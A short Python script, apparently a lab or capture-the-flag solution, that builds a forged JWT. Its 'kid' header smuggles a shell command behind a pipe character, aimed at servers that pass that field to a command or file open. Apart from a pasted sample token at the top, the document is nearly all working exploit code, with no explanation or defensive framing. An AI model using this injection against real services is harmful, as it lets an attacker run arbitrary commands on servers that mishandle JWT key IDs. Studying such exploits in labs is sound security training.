#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y

import base64
header = b'{"typ":"JWT","alg":"HS256","kid":"|/usr/local/bin/score 2fdb31a2-ca58-4650-abfb-9406be061d69"}'
payload = b'{"user":null}'

header = base64.b64encode(header).replace(b'=',b'').replace(b'\n',b'')
payload = base64.b64encode(payload).replace(b'=',b'').replace(b'\n',b'')
signature = b'spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y'

data = header + b'.' + payload
token = data + b'.' + signature
print(token)


